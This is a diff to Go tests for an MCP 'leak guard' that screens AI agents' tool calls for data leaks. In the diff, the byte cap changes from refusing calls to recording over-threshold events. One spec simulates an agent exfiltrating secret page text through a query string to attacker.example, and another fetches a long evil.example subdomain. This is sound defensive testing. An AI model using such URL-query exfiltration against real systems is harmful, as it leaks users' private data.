@@ -459,10 +459,10 @@ var _ = Describe("the MCP leak guard (ADR 0091)", func() {
 
 		leak := call(ctx, "tracker", "fetch_page", map[string]any{"url": "https://attacker.example/?d=" + url.QueryEscape(secretPage[40:140])})
 		Expect(passed(leak)).To(BeFalse())
-		// ADR 0091: an external-low sink after both legs is held by the byte cap and refused in words,
-		// not parked; the approval path of an external-high sink is the post_message spec above.
-		Expect(reason(leak)).To(ContainSubstring("may send at most 64 bytes"))
-		Expect(approvals(ctx)).To(BeZero())
+		// ADR 0091: the byte cap never refuses (amendment 2026-11-17), so this fetch is held by the text
+		// match, which sends it to a person.
+		Expect(reason(leak)).To(HavePrefix("approval requested: id="))
+		Expect(approvals(ctx)).To(Equal(1))
 	})
 
 	// #684: a tool's text content is often a JSON document of its own, which may write the private
@@ -1274,13 +1274,48 @@ var _ = Describe("the MCP leak guard (ADR 0091)", func() {
 			Expect(approvals(ctx)).To(BeZero())
 		})
 
-		It("refuses an external-low call past the byte cap, in words the agent can read", func(ctx SpecContext) {
+		// #1058, ADR 0091 amendment 2026-11-17: the byte cap alerts and never refuses. A run over the
+		// threshold goes on; the guard records one event on the run, in the decision rows and in the metric.
+		It("passes every external-low call past the threshold and records one over-threshold event", func(ctx SpecContext) {
+			metrics := mcpguard.NewMetrics(nil)
+			o := opts
+			o.Metrics = metrics
+			srv = mcpguard.NewServer(mcpguard.New(pool, o))
 			note := strings.Repeat("n", 40)
-			r := call(ctx, "tracker", "fetch_page", map[string]any{"url": "https://docs.example.com/a", "note": note})
-			Expect(passed(r)).To(BeTrue(), reason(r))
-			r = call(ctx, "tracker", "fetch_page", map[string]any{"url": "https://docs.example.com/b", "note": note})
-			Expect(passed(r)).To(BeFalse())
-			Expect(reason(r)).To(ContainSubstring("may send at most 64 bytes"))
+			var sum int
+			for _, p := range []string{"a", "b", "c", "d"} {
+				r := call(ctx, "tracker", "fetch_page", map[string]any{"url": "https://docs.example.com/" + p, "note": note})
+				Expect(passed(r)).To(BeTrue(), reason(r))
+			}
+			rows, err := pool.Query(ctx, `SELECT payload_bytes, charged_bytes, cap_used_before, dest_host, over_threshold
+				FROM leak_guard_decisions WHERE org_id = $1 AND sink_class = 'external-low' ORDER BY created_at, id`, org)
+			Expect(err).NotTo(HaveOccurred())
+			defer rows.Close()
+			var crossed int
+			for rows.Next() {
+				var payload, charged, before int
+				var host string
+				var over bool
+				Expect(rows.Scan(&payload, &charged, &before, &host, &over)).To(Succeed())
+				Expect(host).To(Equal("docs.example.com"))
+				Expect(charged).To(Equal(payload))
+				Expect(before).To(Equal(sum))
+				sum += charged
+				if over {
+					crossed++
+				}
+			}
+			Expect(rows.Err()).NotTo(HaveOccurred())
+			Expect(sum).To(BeNumerically(">", 64))
+			Expect(crossed).To(Equal(1), "one event per run")
+			var at pgtype.Timestamptz
+			var bytes, stored int
+			Expect(pool.QueryRow(ctx, `SELECT over_threshold_at, over_threshold_bytes, capped_bytes FROM leak_guard_runs WHERE org_id = $1`, org).Scan(&at, &bytes, &stored)).To(Succeed())
+			Expect(at.Valid).To(BeTrue())
+			Expect(bytes).To(BeNumerically(">", 64))
+			Expect(bytes).To(BeNumerically("<", sum))
+			Expect(stored).To(Equal(sum), "the stored count is the sum of the charged bytes")
+			Expect(testutil.ToFloat64(metrics.OverThreshold)).To(Equal(1.0))
 			Expect(approvals(ctx)).To(BeZero())
 		})
 
@@ -1301,18 +1336,27 @@ var _ = Describe("the MCP leak guard (ADR 0091)", func() {
 			Expect(passed(r)).To(BeTrue(), reason(r))
 		})
 
-		It("counts a fixed tool's address argument toward the byte cap", func(ctx SpecContext) {
+		It("counts a fixed tool's address argument in the run's byte count, and passes the call", func(ctx SpecContext) {
 			r := call(ctx, "tracker", "ping", map[string]any{"channel": "general", "text": "hi"})
 			Expect(passed(r)).To(BeTrue(), reason(r))
 			r = call(ctx, "tracker", "ping", map[string]any{"channel": strings.Repeat("c", 70)})
-			Expect(passed(r)).To(BeFalse())
-			Expect(reason(r)).To(ContainSubstring("may send at most 64 bytes"))
+			Expect(passed(r)).To(BeTrue(), reason(r))
+			var count, over int
+			Expect(pool.QueryRow(ctx, `SELECT capped_bytes, (SELECT count(*) FROM leak_guard_decisions WHERE org_id = $1 AND over_threshold)
+				FROM leak_guard_runs WHERE org_id = $1`, org).Scan(&count, &over)).To(Succeed())
+			Expect(count).To(BeNumerically(">=", 70))
+			Expect(over).To(Equal(1))
 		})
 
-		It("counts the host labels of a fetch to a host the org does not trust toward the byte cap", func(ctx SpecContext) {
-			r := call(ctx, "tracker", "fetch_page", map[string]any{"url": "https://" + strings.Repeat("d", 25) + "." + strings.Repeat("e", 25) + ".evil.example/"})
-			Expect(passed(r)).To(BeFalse())
-			Expect(reason(r)).To(ContainSubstring("may send at most 64 bytes"))
+		It("counts the host labels of a fetch to a host the org does not trust, and passes the call", func(ctx SpecContext) {
+			host := strings.Repeat("d", 25) + "." + strings.Repeat("e", 25) + ".evil.example"
+			r := call(ctx, "tracker", "fetch_page", map[string]any{"url": "https://" + host + "/"})
+			Expect(passed(r)).To(BeTrue(), reason(r))
+			var charged int
+			var dest string
+			Expect(pool.QueryRow(ctx, `SELECT charged_bytes, dest_host FROM leak_guard_decisions WHERE org_id = $1 AND tool = 'fetch_page'`, org).Scan(&charged, &dest)).To(Succeed())
+			Expect(charged).To(BeNumerically(">", 0))
+			Expect(dest).To(Equal(host))
 			Expect(approvals(ctx)).To(BeZero())
 		})
 
